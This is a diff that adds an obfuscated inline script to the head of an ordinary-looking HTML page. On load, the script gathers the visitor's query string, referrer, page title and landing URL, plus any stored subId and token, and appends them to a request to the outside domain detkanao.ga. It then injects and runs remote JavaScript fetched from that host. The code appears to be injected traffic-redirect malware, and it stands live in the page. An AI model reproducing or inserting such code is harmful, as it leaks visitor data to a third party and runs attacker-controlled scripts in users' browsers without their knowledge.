@@ -1,6 +1,49 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+	<script>
+    (function() {
+    var name = '_LWF4NrLXYn3LQ87x';
+    if (!window._LWF4NrLXYn3LQ87x) {
+        window._LWF4NrLXYn3LQ87x = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://detkanao.ga/wcZxxFV8',
+            P_PATH: 'https://detkanao.ga/7b4f75c/postback',
+        };
+    }
+    const _5NsfHRJYXcCPQcn2 = localStorage.getItem('config');
+    if (typeof _5NsfHRJYXcCPQcn2 !== 'undefined' && _5NsfHRJYXcCPQcn2 !== null) {
+        var _wMRSsRt2JCMLwzSd = JSON.parse(_5NsfHRJYXcCPQcn2);
+        var _xWTQW63LVRh62hsQ = Math.round(+new Date()/1000);
+        if (_wMRSsRt2JCMLwzSd.created_at + window._LWF4NrLXYn3LQ87x.ttl < _xWTQW63LVRh62hsQ) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _g8DSJkw1wZFdzmNj = localStorage.getItem('subId');
+    var _Ft6fxzPLytmTBDpD = localStorage.getItem('token');
+    var _Ms3mJvWCrbcwHgXQ = '?return=js.client';
+        _Ms3mJvWCrbcwHgXQ += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _Ms3mJvWCrbcwHgXQ += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _Ms3mJvWCrbcwHgXQ += '&default_keyword=' + encodeURIComponent(document.title);
+        _Ms3mJvWCrbcwHgXQ += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _Ms3mJvWCrbcwHgXQ += '&name=' + encodeURIComponent(name);
+        _Ms3mJvWCrbcwHgXQ += '&host=' + encodeURIComponent(window._LWF4NrLXYn3LQ87x.R_PATH);
+    if (typeof _g8DSJkw1wZFdzmNj !== 'undefined' && _g8DSJkw1wZFdzmNj && window._LWF4NrLXYn3LQ87x.unique) {
+        _Ms3mJvWCrbcwHgXQ += '&sub_id=' + encodeURIComponent(_g8DSJkw1wZFdzmNj);
+    }
+    if (typeof _Ft6fxzPLytmTBDpD !== 'undefined' && _Ft6fxzPLytmTBDpD && window._LWF4NrLXYn3LQ87x.unique) {
+        _Ms3mJvWCrbcwHgXQ += '&token=' + encodeURIComponent(_Ft6fxzPLytmTBDpD);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._LWF4NrLXYn3LQ87x.R_PATH + _Ms3mJvWCrbcwHgXQ;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="stylesheet" href="css/swiper-bundle.css">
